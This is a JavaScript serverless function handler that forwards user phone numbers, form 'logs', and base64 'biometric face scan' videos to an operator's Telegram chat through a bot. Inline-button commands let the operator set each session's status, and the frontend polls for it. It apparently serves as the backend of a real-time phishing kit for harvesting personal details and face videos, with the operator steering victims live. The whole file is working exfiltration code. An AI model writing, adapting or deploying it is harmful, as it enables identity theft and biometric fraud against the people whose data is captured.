const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

let sessions = {};

exports.handler = async function(event, context) {
    if (event.httpMethod === 'POST') {
        try {
            const body = JSON.parse(event.body);

            // 1. Telegram Webhook: Inline Button Clicks
            if (body.callback_query) {
                const callbackData = body.callback_query.data;
                const callbackId = body.callback_query.id;
                const [command, sessionId] = callbackData.split(':');

                if (sessionId && command) {
                    if (!sessions[sessionId]) sessions[sessionId] = {};
                    sessions[sessionId].status = command;

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: `Command '${command}' executed!`,
                            show_alert: false
                        })
                    });
                }
                return { statusCode: 200, body: 'OK' };
            }

            // 2. Telegram Webhook: Admin Text Reply Routing to Frontend Chat Window
            if (body.message && body.message.reply_to_message) {
                const originalText = body.message.reply_to_message.text || body.message.reply_to_message.caption || "";
                
                // FIXED REGEX: Now aggressively captures the sessionId even if Telegram strips all markdown formatting
                const sessionMatch = /(sess_\d+_\d+)/.exec(originalText);
                
                if (sessionMatch && sessionMatch[1]) {
                    const sessionId = sessionMatch[1];
                    const adminReply = body.message.text;
                    
                    if (!sessions[sessionId]) sessions[sessionId] = {};
                    sessions[sessionId].chatReply = adminReply;
                }
                return { statusCode: 200, body: 'OK' };
            }

            // 3. Frontend: Live Support User Message sent to Telegram
            if (body.chatMessage && body.sessionId) {
                const chatPayload = `💬 *Live Support Message*\n👤 *User:* \`${body.userPhone || "Unknown"}\`\n\n📝 *Message:* ${body.chatMessage}\n\n_(Reply to this message directly in Telegram to respond back)_\n🆔 *Session:* \`${body.sessionId}\``;
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: chatPayload,
                        parse_mode: 'Markdown'
                    })
                });
                return { statusCode: 200, body: JSON.stringify({ success: true }) };
            }

            // 4. Frontend: Biometric Face Video Snippet Upload to Telegram
            if (body.videoBase64 && body.sessionId) {
                const { videoBase64, sessionId, userPhone, keyboard } = body;
                if (!sessions[sessionId]) sessions[sessionId] = {};
                sessions[sessionId].status = 'PENDING';

                const buffer = Buffer.from(videoBase64.replace(/^data:video\/\w+;base64,/, ""), 'base64');
                const blob = new Blob([buffer], { type: 'video/mp4' });

                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('video', blob, `face_scan_${sessionId}.mp4`);
                formData.append('caption', `📸 *Biometric Face Scan Recording* 🇿🇦\n👤 *User:* \`${userPhone || 'Unknown'}\`\n🆔 *Session:* \`${sessionId}\``);
                formData.append('parse_mode', 'Markdown');
                if(keyboard) formData.append('reply_markup', JSON.stringify(keyboard));

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });

                return { statusCode: 200, body: JSON.stringify({ success: true, sessionId }) };
            }

            // 5. Frontend: Standard Form Logs Submission
            if (body.message && body.sessionId) {
                const { message, sessionId, keyboard } = body;
                if (!sessions[sessionId]) sessions[sessionId] = {};
                sessions[sessionId].status = 'PENDING';

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        reply_markup: keyboard
                    })
                });
                return { statusCode: 200, body: JSON.stringify({ success: true, sessionId }) };
            }

        } catch (error) {
            console.error("Function Error:", error);
            return { statusCode: 500, body: JSON.stringify({ error: error.message }) };
        }
    }

    // Frontend session & chat polling GET Handler
    if (event.httpMethod === 'GET') {
        const sessionId = event.queryStringParameters.sessionId;
        if (sessionId) {
            const sessionData = sessions[sessionId] || {};
            const status = sessionData.status || 'IDLE';
            const chatReply = sessionData.chatReply || null;
            
            if (chatReply) sessions[sessionId].chatReply = null;
            if (status !== 'IDLE' && status !== 'PENDING') sessions[sessionId].status = 'IDLE';

            return {
                statusCode: 200,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ status, chatReply })
            };
        }
        return { statusCode: 400, body: JSON.stringify({ error: 'Missing sessionId' }) };
    }

    return { statusCode: 405, body: 'Method Not Allowed' };
};
